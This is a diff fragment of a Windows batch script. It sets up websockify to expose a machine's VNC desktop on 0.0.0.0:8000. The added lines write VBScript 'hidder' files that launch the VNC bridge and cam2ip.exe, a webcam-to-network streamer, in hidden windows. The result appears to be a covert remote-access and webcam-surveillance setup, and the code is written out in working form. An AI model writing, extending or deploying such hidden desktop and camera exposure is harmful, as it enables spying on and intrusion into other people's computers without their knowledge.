@@ -32,15 +32,14 @@ echo source: '0.0.0.0:8000', >> websockify.js
 echo target: '%LANIP%:5900' >> websockify.js
 echo }); >> websockify.js
 
+echo Dim WShell > vnc_hidder.vbs
+echo Set WShell = CreateObject("WScript.Shell") >> vnc_hidder.vbs
+echo WShell.Run "node websockify.js", 0 >> vnc_hidder.vbs
+echo Set WShell = Nothing >> vnc_hidder.vbs
+wscript vnc_hidder.vbs
 
-echo npm install --save node-websockify > npm_websockify.bat
-echo exit >> npm_websockify.bat 
-timeout 10
-START npm_websockify.bat
-timeout 5
-
-echo Dim WShell > hidder.vbs
-echo Set WShell = CreateObject("WScript.Shell") >> hidder.vbs
-echo WShell.Run "node websockify.js", 0 >> hidder.vbs
-echo Set WShell = Nothing >> hidder.vbs
-wscript hidder.vbs
+echo Dim WShell > cam2ip_hidder.vbs
+echo Set WShell = CreateObject("WScript.Shell") >> cam2ip_hidder.vbs
+echo WShell.Run "cam2ip.exe", 0 >> cam2ip_hidder.vbs
+echo Set WShell = Nothing >> cam2ip_hidder.vbs
+wscript cam2ip_hidder.vbs
